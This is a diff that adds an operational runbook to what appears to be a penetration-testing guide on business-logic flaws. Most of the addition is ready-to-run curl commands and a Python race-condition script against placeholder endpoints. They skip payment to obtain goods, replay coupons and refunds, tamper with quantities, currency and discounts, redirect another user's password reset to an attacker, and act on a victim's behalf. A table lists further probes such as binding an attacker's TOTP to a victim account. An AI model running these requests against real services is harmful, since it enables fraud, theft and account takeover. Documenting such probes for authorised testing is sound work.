@@ -132,6 +132,134 @@ Business logic flaws exploit intended functionality to violate domain invariants
 - Business logic + IDOR: operate on others' resources once a workflow leak reveals IDs
 - Business logic + CSRF: force a victim to complete a sensitive step sequence
 
+## Operational Runbook
+
+Business-logic abuse doesn't map to a single payload. The flow is: model the intended state machine → identify implicit invariants → probe transitions that the developer didn't expect.
+
+### Step 1 — map the workflow
+
+Pick a high-value workflow (purchase, refund, transfer, invitation, password reset). Document:
+
+```
+Step 1: POST /api/cart/add {item_id, qty}
+Step 2: POST /api/checkout {address}
+Step 3: POST /api/payment {card, amount}   # invariant: amount == cart total
+Step 4: GET  /api/order/{id}               # invariant: status=paid before fulfilment
+Step 5: POST /api/fulfilment {order_id}    # invariant: only after step 4
+```
+
+Each `→` is a transition. Each transition has implicit pre/post-conditions. Each invariant is a target.
+
+### Step 2 — probe step skipping
+
+```bash
+# Try going straight from Step 1 to Step 5 (skip payment + checkout entirely)
+CART_ID=$(curl -s -X POST '<TARGET>/api/cart/add' \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"item_id":1,"qty":1}' | jq -r '.cart_id')
+
+# Skip Steps 2-4. Does fulfilment fire without payment?
+curl -s -X POST "<TARGET>/api/fulfilment" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d "{\"cart_id\":\"$CART_ID\"}" -w '\n%{http_code}\n'
+
+# 2xx → state machine doesn't enforce step ordering. Free goods.
+```
+
+### Step 3 — probe step repetition
+
+```bash
+# Apply a single-use coupon, then apply it again
+curl -s -X POST '<TARGET>/api/coupon' -H "Authorization: Bearer $TOKEN" -d '{"code":"WELCOME50"}'
+curl -s -X POST '<TARGET>/api/coupon' -H "Authorization: Bearer $TOKEN" -d '{"code":"WELCOME50"}'
+# Second response 2xx + balance doubled → no one-time check
+
+# Refund an already-refunded order
+curl -s -X POST '<TARGET>/api/refund' -H "Authorization: Bearer $TOKEN" -d '{"order_id":"X"}'
+curl -s -X POST '<TARGET>/api/refund' -H "Authorization: Bearer $TOKEN" -d '{"order_id":"X"}'
+```
+
+### Step 4 — probe parameter tampering
+
+```bash
+# Negative quantity → negative price → server credits you
+curl -s -X POST '<TARGET>/api/cart/add' \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"item_id":1,"qty":-5}'
+
+# Currency manipulation
+curl -s -X POST '<TARGET>/api/payment' \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"amount":1,"currency":"VND","cart_total":1000000}'
+# Server confuses currencies → effectively pay $0.04 USD for $1000 worth
+
+# Decimal overflow / precision tricks
+curl -s -X POST '<TARGET>/api/payment' \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"amount":0.999999999999999}'   # rounds to 1 in display, 0 in charge
+
+# Discount > 100%
+curl -s -X POST '<TARGET>/api/discount' \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"percent":150}'
+```
+
+### Step 5 — probe state-machine race (overlap with race_conditions.md)
+
+```python
+# Fire 10 "transfer money" requests in parallel; if a single deduction
+# results in 10 credits, the state machine isn't atomic
+import asyncio, httpx
+async def transfer(client):
+    return await client.post("<TARGET>/api/transfer",
+        json={"to":"victim","amount":100},
+        headers={"Authorization":"Bearer $TOKEN"})
+async def main():
+    async with httpx.AsyncClient(http2=True) as c:
+        results = await asyncio.gather(*[transfer(c) for _ in range(10)])
+        for r in results: print(r.status_code, r.json())
+asyncio.run(main())
+```
+
+### Step 6 — probe missing actor checks
+
+```bash
+# Reset another user's password by tampering the email field
+curl -s -X POST '<TARGET>/api/password-reset' \
+    -d '{"email":"victim@x"}'    # baseline — sends to victim
+
+curl -s -X POST '<TARGET>/api/password-reset' \
+    -d '{"email":"victim@x","redirect":"attacker@x"}'    # extra field — does server honor it?
+
+# Submit on someone else's behalf
+curl -s -X POST '<TARGET>/api/feedback' \
+    -H "Authorization: Bearer $MY_TOKEN" \
+    -d '{"user_id":"victim_id","content":"bad review"}'
+```
+
+### Step 7 — high-value workflow library
+
+| Workflow | Probe |
+|---|---|
+| E-commerce checkout | Coupon stacking; negative qty; price tampering in client-supplied total; address swap post-payment |
+| Account creation | Email verification skip; signup with `is_admin` body field; race-create with duplicate emails |
+| Password reset | Reuse expired token; submit token without invalidation; replay token in concurrent sessions |
+| Currency / wallet | Negative transfer; transfer to self for credits; race-double-spend; currency-symbol confusion |
+| Subscription tier upgrade | Downgrade-refund-upgrade cycle; pro-rate calculation manipulation; trial reset via account suspend-unsuspend |
+| Multi-factor auth setup | Skip verification step; bind attacker TOTP to victim account via partial state |
+| API rate limits | Per-IP vs per-user vs per-API-key — switch identifier mid-burst |
+| OAuth flow | State parameter strip; PKCE skip; redirect_uri manipulation; consent screen bypass via direct token request |
+| File-upload pipeline | Skip antivirus scan step; race-upload-then-delete-AV-marker; reuse upload-token across users |
+
+### Step 8 — record evidence
+
+Document:
+- Workflow diagram (steps + intended invariants)
+- The invariant violated
+- Reproducible request sequence (curl commands in order)
+- Quantified impact (e.g. "applied $50 coupon 30× = $1500 free credit")
+- Severity is almost always at least **high** — business-logic vulns cost real money.
+
 ## Testing Methodology
 
 1. **Enumerate state machine** - Per critical workflow (states, transitions, pre/post-conditions); note invariants
